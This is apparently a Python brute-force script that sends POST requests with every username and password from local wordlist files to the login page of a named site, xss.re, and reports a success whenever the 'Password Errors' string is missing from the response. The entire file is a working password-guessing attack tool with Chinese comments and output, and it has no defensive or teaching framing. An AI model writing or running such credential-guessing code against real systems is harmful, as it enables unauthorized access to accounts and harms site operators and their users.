from urllib import request
from http import client
import os, re
from time import ctime

Host = 'xss.re'
url = 'http://xss.re/user/login'
headers = {'Host':'xss.re', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0', 
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
			'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 
			'DNT': '1', 'Referer': 'http://xss.re/xss/?do=user&act=login', 'Content-Type': 'application/x-www-form-urlencoded' 
			}
patt_error = 'Password Errors'
		

def bruteforce(username, password):
	username = username.strip()
	password = password.strip()
	data = 'username='+username+'&password='+password+'&submit=Log+in'
	data_b = data.encode(encoding='gb18030')#这个编码主要针对汉字可能会出错的处理
	try:
		conn = client.HTTPConnection(Host, timeout=5)#设置超时时间，防止太长时间出错
		conn.request(method='POST', url=url, body=data_b, headers=headers)
		resp = conn.getresponse()
		resp_data = resp.read()
		decode_data = resp_data.decode()
		result = re.search(patt_error, decode_data)
		if result is None:
			print('登陆成功！用户名：{0} 密码：{1}'.format(username, password))
		conn.close()
	except Exception as e:
		print('f4ck error is : {}'.format(e))
		pass
		
def main():
	try:
		f_username = open('username.txt', 'r+')
	except Exception as e:
		print(e)
		os._exit()
	i=1
	for username in f_username.readlines():
		if username != '':
			try:
				f_password = open('password.txt', 'r+')
			except Exception as e:
				print(e)
				os._exit()
			for password in f_password.readlines():
				bruteforce(username, password)
			f_password.close()
	f_username.close()


if __name__ == '__main__':
	print('bruteforce start at : {}'.format(ctime()))
	t1 = ctime()
	main()
	print('bruteforce stop at : {}'.format(ctime()))
	t2 = ctime()
	print('耗时：{}'.format(t2-t1))
